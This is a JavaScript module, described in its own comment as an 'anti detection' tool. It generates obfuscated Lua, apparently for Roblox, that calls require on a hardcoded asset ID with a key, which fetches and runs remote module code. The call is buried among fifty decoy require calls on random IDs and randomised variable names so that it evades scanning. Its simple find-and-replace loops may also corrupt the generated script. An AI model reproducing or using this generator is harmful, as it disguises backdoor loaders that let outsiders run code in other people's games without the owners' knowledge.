/*

	this shit uses an bad custom "anti detection" shit module so change the module if you want lmao
	it's open sourced too

*/

function randomLetter() {
	var result = '';
	var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
	var charactersLength = characters.length;
	for ( var i = 0; i < 1; i++ ) {
	  result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}

function randomString(length) {
	var result = randomLetter();
	var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
	var charactersLength = characters.length;
	for ( var i = 0; i < length-1; i++ ) {
	  result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}

export default function() {
	let scriptTemplate = "--[[\n  stringHere\n  stringHere\n  stringHere\n  stringHere\n]]\n\nvariable = \"value\"\nvariable = \"value\"\nvariable = \"value\"\nvariable = \"value\"\nvariable = \"value\"\nvariable = \"value\"\nreeq = require\nspw = spawn\npcll = pcall\nmt = math\nrn = mt.random\nmdu = 8678948758\nkey = \"hello!\"\nmapId = MODULO_AQUI\n\nspw(function()\nfor raan=1,50 do\npcll(reeq,rn(799999999,895648569))\nend\nend)\n\nreeq(mdu)(mapId,key)\n\nspw(function()\nfor raan=1,50 do\npcll(reeq,rn(799999999,895648569))\nend\nend)\n\n";

	let requireVar = randomString(23);
	let spawnVar = randomString(23);
	let pcallVar = randomString(23);
	let mathVar = randomString(23);
	let ranVar = randomString(23);
	let idVar = randomString(23);
	let keyVar = randomString(33);
	let mapVar = randomString(35);

	for (var _ of scriptTemplate.match(/mapId/ig)) {
	  scriptTemplate = scriptTemplate.replace("mapId", function () {
		return mapVar
	  })
	}

	for (var _ of scriptTemplate.match(/key/ig)) {
	  scriptTemplate = scriptTemplate.replace("key", function () {
		return keyVar
	  })
	}

	for (var _ of scriptTemplate.match(/mdu/ig)) {
	  scriptTemplate = scriptTemplate.replace("mdu", function () {
		return idVar
	  })
	}

	for (var _ of scriptTemplate.match(/spw/ig)) {
	  scriptTemplate = scriptTemplate.replace("spw", function () {
		return spawnVar
	  })
	}

	for (var _ of scriptTemplate.match(/pcll/ig)) {
	  scriptTemplate = scriptTemplate.replace("pcll", function () {
		return pcallVar
	  })
	}

	for (var _ of scriptTemplate.match(/rn/ig)) {
	  scriptTemplate = scriptTemplate.replace("rn", function () {
		return ranVar
	  })
	}

	for (var _ of scriptTemplate.match(/stringHere/ig)) {
	  scriptTemplate = scriptTemplate.replace("stringHere", function () {
		return randomString(40)
	  })
	}

	for (var _ of scriptTemplate.match(/variable/ig)) {
	  scriptTemplate = scriptTemplate.replace("variable", function () {
		return randomString(23)
	  })
	}

	for (var _ of scriptTemplate.match(/value/ig)) {
	  scriptTemplate = scriptTemplate.replace("value", function () {
		return randomString(23)
	  })
	}

	for (var _ of scriptTemplate.match(/reeq/ig)) {
	  scriptTemplate = scriptTemplate.replace("reeq", function () {
		return requireVar
	  })
	}

	for (var _ of scriptTemplate.match(/raan/ig)) {
	  scriptTemplate = scriptTemplate.replace("raan", function () {
		return randomLetter()
	  })
	}
	
	for (var _ of scriptTemplate.match(/mt/ig)) {
	  scriptTemplate = scriptTemplate.replace("mt", function () {
		return mathVar
	  })
	}
	
	return scriptTemplate
}